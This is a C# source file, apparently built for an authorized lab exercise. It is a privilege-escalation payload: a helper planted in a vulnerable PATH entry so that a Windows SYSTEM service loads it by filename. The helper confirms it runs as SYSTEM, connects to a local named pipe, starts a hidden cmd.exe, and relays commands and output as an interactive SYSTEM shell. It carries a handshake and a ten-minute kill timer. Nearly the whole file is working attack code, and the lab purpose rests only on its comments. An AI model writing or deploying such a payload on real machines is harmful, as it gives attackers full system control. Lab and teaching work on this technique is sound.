// NORTH Topic 13: local-only command-channel client for an authorized WS01 lab.
// The SYSTEM service loads this helper by filename from the vulnerable PATH entry.
// No sockets, outbound traffic, persistence, or user token modification.
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Security.Principal;
using System.Text;
using System.Threading;

internal static class KingdomPathShell
{
    private const string PipeName = "KingdomsTopic13Console";
    private const int ConnectTimeoutMs = 12000;
    private const int SessionTimeoutMs = 600000;

    private static void ForwardOutput(StreamReader source, StreamWriter destination, object gate)
    {
        char[] block = new char[1024];
        try
        {
            int count;
            while ((count = source.Read(block, 0, block.Length)) > 0)
            {
                lock (gate)
                {
                    destination.Write(block, 0, count);
                    destination.Flush();
                }
            }
        }
        catch (IOException) { }
        catch (ObjectDisposedException) { }
    }

    public static void Main()
    {
        // Fail closed if a caller starts this exercise-only helper outside SYSTEM.
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        if (identity.User == null || identity.User.Value != "S-1-5-18") return;

        try
        {
            using (NamedPipeClientStream pipe = new NamedPipeClientStream(
                ".", PipeName, PipeDirection.InOut, PipeOptions.None,
                TokenImpersonationLevel.Impersonation))
            {
                pipe.Connect(ConnectTimeoutMs);
                using (StreamReader request = new StreamReader(pipe, new UTF8Encoding(false), true, 1024, true))
                using (StreamWriter response = new StreamWriter(pipe, new UTF8Encoding(false), 1024, true))
                using (Process cmd = new Process())
                {
                    // Authenticate the local SYSTEM client before spawning cmd.exe.
                    response.AutoFlush = true;
                    response.WriteLine("KINGDOMS_TOPIC13_HELLO");
                    if (request.ReadLine() != "KINGDOMS_TOPIC13_APPROVED") return;

                    cmd.StartInfo.FileName = Path.Combine(Environment.SystemDirectory, "cmd.exe");
                    cmd.StartInfo.Arguments = "/Q /D";
                    cmd.StartInfo.UseShellExecute = false;
                    cmd.StartInfo.CreateNoWindow = true;
                    cmd.StartInfo.RedirectStandardInput = true;
                    cmd.StartInfo.RedirectStandardOutput = true;
                    cmd.StartInfo.RedirectStandardError = true;
                    cmd.StartInfo.WorkingDirectory = Environment.SystemDirectory;
                    if (!cmd.Start()) return;

                    object outputGate = new object();
                    response.AutoFlush = true;
                    Thread stdout = new Thread(() => ForwardOutput(cmd.StandardOutput, response, outputGate));
                    Thread stderr = new Thread(() => ForwardOutput(cmd.StandardError, response, outputGate));
                    stdout.IsBackground = true;
                    stderr.IsBackground = true;
                    stdout.Start();
                    stderr.Start();

                    // A disconnected console, "exit", or the ten-minute hard limit
                    // must never leave a SYSTEM command process behind.
                    using (Timer timer = new Timer(delegate(object unused)
                    {
                        try { if (!cmd.HasExited) cmd.Kill(); } catch { }
                        try { pipe.Close(); } catch { }
                    }, null, SessionTimeoutMs, Timeout.Infinite))
                    {
                        Thread monitor = new Thread(delegate()
                        {
                            try { cmd.WaitForExit(); pipe.Close(); } catch { }
                        });
                        monitor.IsBackground = true;
                        monitor.Start();

                        try
                        {
                            string line;
                            while (!cmd.HasExited && (line = request.ReadLine()) != null)
                            {
                                if (line == "::kingdom-close::") break;
                                cmd.StandardInput.WriteLine(line);
                                cmd.StandardInput.Flush();
                            }
                        }
                        catch (IOException) { }
                        catch (ObjectDisposedException) { }
                        finally
                        {
                            try { cmd.StandardInput.Close(); } catch { }
                            try { if (!cmd.HasExited) cmd.Kill(); } catch { }
                            try { cmd.WaitForExit(3000); } catch { }
                        }
                    }
                }
            }
        }
        catch (IOException) { }
        catch (TimeoutException) { }
        catch (UnauthorizedAccessException) { }
    }
}
